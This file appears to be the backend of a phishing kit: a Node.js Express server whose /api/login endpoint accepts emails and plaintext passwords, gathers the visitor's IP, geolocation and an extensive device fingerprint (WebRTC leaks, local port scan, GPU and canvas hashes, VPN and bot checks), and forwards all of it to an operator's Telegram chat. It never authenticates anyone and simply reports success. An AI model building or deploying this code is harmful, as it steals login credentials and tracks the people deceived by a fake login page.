const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Fingerprint payload can be moderately large — raise the JSON body limit.
app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: true, limit: '256kb' }));

// Trust proxy - important for Render to get real IP
app.set('trust proxy', true);

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    return req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  }
});
app.use('/api/login', limiter);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

/* ==========================================================================
 * Helpers
 * ======================================================================== */

// Function to get real client IP
function getClientIP(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  const realIP = req.headers['x-real-ip'];
  const cfConnectingIP = req.headers['cf-connecting-ip'];
  const trueClientIP = req.headers['true-client-ip'];
  
  if (cfConnectingIP) return cfConnectingIP;
  if (trueClientIP) return trueClientIP;
  
  if (forwardedFor) {
    const ips = forwardedFor.split(',');
    return ips[0].trim();
  }
  
  if (realIP) return realIP;
  
  return req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
}

// Function to format timestamp
function formatTimestamp(date) {
  const options = {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
    timeZone: process.env.TIMEZONE || 'Africa/Lagos'
  };
  
  try {
    return date.toLocaleString('en-US', options);
  } catch (error) {
    return date.toLocaleString();
  }
}

// Telegram HTML-escape — prevents a crafted fingerprint string from breaking
// the message or injecting tags.
function esc(value) {
  if (value === null || value === undefined) return 'N/A';
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// Truncate long strings for the Telegram message
function trunc(value, max = 120) {
  if (value === null || value === undefined) return 'N/A';
  const s = String(value);
  return s.length > max ? s.slice(0, max - 1) + '…' : s;
}

// Function to send message to Telegram
async function sendToTelegram(message) {
  try {
    const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
    
    console.log('Telegram message sent successfully');
    return { success: true, data: response.data };
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
    return { success: false, error: error.message };
  }
}

// Function to get IP geolocation
async function getIPLocation(ip) {
  try {
    if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('::ffff:')) {
      return 'Local/Private Network';
    }
    
    const response = await axios.get(`http://ip-api.com/json/${ip}`, {
      timeout: 5000
    });
    
    if (response.data && response.data.status === 'success') {
      const location = [];
      if (response.data.city) location.push(response.data.city);
      if (response.data.regionName) location.push(response.data.regionName);
      if (response.data.country) location.push(response.data.country);
      if (response.data.isp) location.push(`ISP: ${response.data.isp}`);
      
      return location.join(', ') || 'Unknown';
    }
    return 'Unknown';
  } catch (error) {
    console.error('Error getting location:', error.message);
    return 'Unknown';
  }
}

/* ==========================================================================
 * Fingerprint formatting
 * ======================================================================== */

/**
 * Renders the client fingerprint payload into a compact Telegram block.
 * Returns an empty string if no fingerprint was sent.
 */
function formatFingerprint(fp) {
  if (!fp || typeof fp !== 'object') return '';
  if (fp.error) {
    return `\n🧬 <b>Fingerprint:</b> <i>unavailable (${esc(fp.error)})</i>`;
  }

  const lines = [];
  lines.push('');
  lines.push('━━━━━━━━━━━━━━━━━━━━');
  lines.push('🧬 <b>Device Fingerprint</b>');

  // Stable hash
  if (fp.hash) {
    lines.push(`🔑 <b>Hash:</b> <code>${esc(fp.hash)}</code>`);
  }

  // --- Proxy / VPN verdict ---
  const proxyScore = fp.proxyScore ?? 0;
  const likelyProxy = fp.likelyProxy === true;
  const flag = likelyProxy ? '🚨' : (proxyScore >= 20 ? '⚠️' : '✅');
  lines.push(`${flag} <b>Proxy Score:</b> ${proxyScore}/100 ${likelyProxy ? '<b>(LIKELY PROXY/VPN)</b>' : ''}`);

  if (Array.isArray(fp.proxyReasons) && fp.proxyReasons.length) {
    lines.push(`   ↳ ${esc(fp.proxyReasons.join(', '))}`);
  }

  // --- IP / Geo from client-side lookup ---
  if (fp.publicIp) {
    lines.push(`🌐 <b>Client-side IP:</b> ${esc(fp.publicIp)}`);
  }
  if (fp.ipGeo) {
    const parts = [
      fp.ipGeo.city,
      fp.ipGeo.region,
      fp.ipGeo.country
    ].filter(Boolean).join(', ');
    if (parts) lines.push(`📍 <b>IP Geo:</b> ${esc(parts)}`);
    if (fp.ipGeo.org) lines.push(`🏢 <b>Org/ASN:</b> ${esc(fp.ipGeo.org)}`);
    if (fp.ipGeo.timezone) lines.push(`🕐 <b>IP Timezone:</b> ${esc(fp.ipGeo.timezone)}`);
  }

  // --- WebRTC leak ---
  if (fp.webrtc && fp.webrtc.supported) {
    const pub = (fp.webrtc.publicAddresses || []).join(', ');
    const priv = (fp.webrtc.privateAddresses || []).join(', ');
    if (pub) lines.push(`📡 <b>WebRTC Public IP:</b> <code>${esc(trunc(pub, 80))}</code>`);
    if (priv) lines.push(`📡 <b>WebRTC Private IP:</b> <code>${esc(trunc(priv, 80))}</code>`);
    if (fp.webrtc.mdnsObfuscated) lines.push('   ↳ <i>mDNS obfuscation active</i>');
  }

  // --- Port scan / local proxy detection ---
  if (fp.portScan && fp.portScan.heuristics) {
    const h = fp.portScan.heuristics;
    if (Array.isArray(fp.portScan.openPorts) && fp.portScan.openPorts.length) {
      lines.push(`🔓 <b>Open Local Ports:</b> ${esc(fp.portScan.openPorts.join(', '))}`);
    }
    if (h.likelyInterceptingProxy) {
      lines.push('🚨 <b>Intercepting proxy detected on localhost</b>');
    }
    if (h.portScanProtectionLikely) {
      lines.push('🛡 <b>Port scan protection active</b>');
    }
  }

  // --- Environment ---
  if (fp.timezone) {
    const offset = fp.timezoneOffset != null
      ? ` (UTC${fp.timezoneOffset <= 0 ? '+' : '-'}${Math.abs(fp.timezoneOffset / 60).toFixed(1)})`
      : '';
    lines.push(`🕐 <b>Browser TZ:</b> ${esc(fp.timezone)}${offset}`);
  }
  if (fp.languages && fp.languages.length) {
    lines.push(`🌍 <b>Languages:</b> ${esc(trunc(fp.languages.join(', '), 60))}`);
  }
  if (fp.platform) {
    lines.push(`💻 <b>Platform:</b> ${esc(fp.platform)}`);
  }

  // --- Screen & hardware ---
  if (Array.isArray(fp.screen)) {
    const [w, h, depth, dpr] = fp.screen;
    lines.push(`🖥 <b>Screen:</b> ${w}x${h} @${dpr}x, ${depth}-bit`);
  }
  if (fp.hardware) {
    const hw = [];
    if (fp.hardware.hardwareConcurrency != null) hw.push(`${fp.hardware.hardwareConcurrency} cores`);
    if (fp.hardware.deviceMemory != null) hw.push(`${fp.hardware.deviceMemory}GB RAM`);
    if (hw.length) lines.push(`⚙️ <b>Hardware:</b> ${esc(hw.join(', '))}`);
  }

  // --- GPU ---
  if (fp.webgl) {
    const gpu = fp.webgl.renderer || fp.webgl.vendor;
    if (gpu) {
      lines.push(`🎮 <b>GPU:</b> ${esc(trunc(gpu, 100))}`);
    }
    if (fp.webgl.software) {
      lines.push('   ↳ ⚠️ <i>Software renderer (VM/headless?)</i>');
    }
  }

  // --- Stable per-device hashes ---
  const hashParts = [];
  if (fp.canvas) hashParts.push(`canvas:<code>${esc(fp.canvas)}</code>`);
  if (fp.audio) hashParts.push(`audio:<code>${esc(fp.audio)}</code>`);
  if (fp.fonts) hashParts.push(`fonts:<code>${esc(fp.fonts)}</code> (${fp.fontsCount ?? '?'})`);
  if (hashParts.length) {
    lines.push(`🧮 <b>Signal Hashes:</b>`);
    hashParts.forEach((p) => lines.push(`   ${p}`));
  }

  // --- Media devices ---
  if (fp.media) {
    const m = fp.media;
    const bits = [];
    if (m.videoinput) bits.push(`${m.videoinput} cam`);
    if (m.audioinput) bits.push(`${m.audioinput} mic`);
    if (m.audiooutput) bits.push(`${m.audiooutput} spk`);
    if (bits.length) lines.push(`🎥 <b>Media Devices:</b> ${esc(bits.join(', '))}`);
  }

  // --- UA consistency / bot signals ---
  if (fp.uaConsistency) {
    const c = fp.uaConsistency;
    const flags = [];
    if (c.iPadMasqueradingAsMac) flags.push('iPad-as-Mac');
    if (c.platformOsMismatch) flags.push('platform/UA mismatch');
    if (c.chromeUaWithoutChromeObject) flags.push('fake Chrome UA');
    if (Array.isArray(c.headlessMarkers) && c.headlessMarkers.length) {
      flags.push(`headless: ${c.headlessMarkers.join(',')}`);
    }
    if (flags.length) {
      lines.push(`🤖 <b>Bot Signals:</b> ${esc(flags.join(' | '))}`);
    }
  }

  return '\n' + lines.join('\n');
}

/* ==========================================================================
 * Login message formatter
 * ======================================================================== */

function formatLoginDetails(loginData) {
  const now = new Date();
  const timestamp = formatTimestamp(now);
  const utcTimestamp = now.toISOString();
  
  const message = `
🔐 <b>New Login Attempt</b>
━━━━━━━━━━━━━━━━━━━━
📅 <b>Date/Time:</b> ${esc(timestamp)}
🌍 <b>UTC Time:</b> ${esc(utcTimestamp)}
📧 <b>Email:</b> ${esc(loginData.email)}
🔑 <b>Password:</b> ${esc(loginData.password)}
🌐 <b>IP Address:</b> ${esc(loginData.ip)}
📍 <b>Location:</b> ${esc(loginData.location)}
🖥 <b>User Agent:</b> <code>${esc(trunc(loginData.userAgent, 200))}</code>${formatFingerprint(loginData.fingerprint)}
━━━━━━━━━━━━━━━━━━━━
  `;
  
  return message;
}

/* ==========================================================================
 * Routes
 * ======================================================================== */

// Main login endpoint
app.post('/api/login', async (req, res) => {
  try {
    const { email, password, fingerprint } = req.body;
    
    if (!email) {
      return res.status(400).json({
        success: false,
        message: 'Email is required'
      });
    }
    
    if (!password) {
      return res.status(400).json({
        success: false,
        message: 'Password is required'
      });
    }
    
    // Get real client IP
    const clientIP = getClientIP(req);
    const userAgent = req.headers['user-agent'];
    
    console.log('Detected IP:', clientIP);
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Prepare login data (fingerprint passed straight through)
    const loginData = {
      email,
      password,
      ip: clientIP,
      location: location,
      userAgent,
      fingerprint: fingerprint || null
    };
    
    // Log the login attempt (drop the huge fingerprint fields from the log line)
    console.log('Login attempt:', {
      email,
      ip: clientIP,
      location,
      timestamp: new Date().toISOString(),
      hasFingerprint: !!fingerprint,
      proxyScore: fingerprint ? fingerprint.proxyScore : null,
      likelyProxy: fingerprint ? fingerprint.likelyProxy : null
    });
    
    // Format and send to Telegram
    const message = formatLoginDetails(loginData);
    const telegramResponse = await sendToTelegram(message);
    
    res.status(200).json({
      success: true,
      message: 'Login processed successfully',
      ip: clientIP
    });
    
  } catch (error) {
    console.error('Error processing login:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  const clientIP = getClientIP(req);
  res.status(200).json({
    status: 'OK',
    timestamp: formatTimestamp(new Date()),
    utcTimestamp: new Date().toISOString(),
    detectedIP: clientIP,
    timezone: process.env.TIMEZONE || 'Africa/Lagos'
  });
});

// Test endpoint to verify Telegram connection
app.get('/api/test-telegram', async (req, res) => {
  const testMessage = `✅ Test message from your login server!\n🕐 Local time: ${formatTimestamp(new Date())}\n🌍 UTC: ${new Date().toISOString()}`;
  const result = await sendToTelegram(testMessage);
  
  if (result.success) {
    res.status(200).json({
      success: true,
      message: 'Test message sent to Telegram successfully'
    });
  } else {
    res.status(500).json({
      success: false,
      message: 'Failed to send test message',
      error: result.error
    });
  }
});

// Debug endpoint
app.get('/api/debug-ip', (req, res) => {
  const clientIP = getClientIP(req);
  res.json({
    detectedIP: clientIP,
    timestamp: formatTimestamp(new Date()),
    utcTimestamp: new Date().toISOString(),
    timezone: process.env.TIMEZONE || 'Africa/Lagos',
    headers: {
      'x-forwarded-for': req.headers['x-forwarded-for'],
      'x-real-ip': req.headers['x-real-ip'],
      'cf-connecting-ip': req.headers['cf-connecting-ip'],
      'true-client-ip': req.headers['true-client-ip']
    }
  });
});

// Root endpoint - just return a simple message
app.get('/', (req, res) => {
  res.status(200).json({
    message: 'Login API Server',
    status: 'Running',
    endpoints: {
      login: 'POST /api/login',
      health: 'GET /health',
      testTelegram: 'GET /api/test-telegram',
      debugIP: 'GET /api/debug-ip'
    }
  });
});

// Handle 404 for unknown routes
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found'
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
  console.log(`💬 Chat ID configured: ${TELEGRAM_CHAT_ID ? 'Yes' : 'No'}`);
  console.log(`🕐 Timezone: ${process.env.TIMEZONE || 'Africa/Lagos'}`);
  console.log(`🌐 IP detection: Enhanced with proxy support`);
  console.log(`🧬 Fingerprint ingestion: Enabled`);
  console.log(`📅 Current time: ${formatTimestamp(new Date())}`);
  console.log(`🔗 API only - No static file serving`);
});
